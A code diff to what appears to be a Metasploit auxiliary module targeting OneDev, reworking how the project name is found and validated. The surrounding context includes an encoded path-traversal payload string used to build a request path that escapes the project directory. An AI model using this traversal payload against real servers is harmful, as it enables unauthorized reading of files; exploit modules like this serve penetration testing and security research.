@@ -96,11 +96,12 @@ class MetasploitModule < Msf::Auxiliary
   def run
     project_name = datastore['PROJECT_NAME']
 
-    project_name = find_project if project_name.strip.empty?
-
-    fail_with(Failure::NoTarget, 'No valid OneDev project was found.') unless project_name
-
-    fail_with(Failure::NoTarget, 'Provided project name is invalid.') unless validate_project_exists(project_name)
+    if project_name.strip.empty?
+      project_name = find_project 
+      fail_with(Failure::NoTarget, 'No valid OneDev project was found.') unless project_name
+    else
+      fail_with(Failure::NoTarget, 'Provided project name is invalid.') unless validate_project_exists(project_name)      
+    end
 
     path_traversal = '~site////////%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e'
     payload_path = normalize_uri(target_uri.path, project_name)
